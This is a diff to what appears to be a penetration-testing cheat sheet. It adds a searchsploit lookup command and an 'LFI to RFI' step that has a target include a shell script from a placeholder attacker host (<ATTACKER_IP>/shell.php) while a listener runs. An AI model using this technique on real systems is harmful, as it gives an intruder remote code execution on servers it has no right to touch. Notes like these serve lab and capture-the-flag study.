@@ -171,6 +171,21 @@ powershell_shell
 
 ----
 
+## Searchsploit
+
+````
+searchsploit <SERVICE_NAME>
+````
+
+----
+
+## LFI TO RFI
+
+- Open a listening server on attacker machine
+- LFI : http://<ATTACKER_IP>/shell.php 
+
+----
+
 ## Privilege Escalation
 
 - Linepeas (quick enumeration)
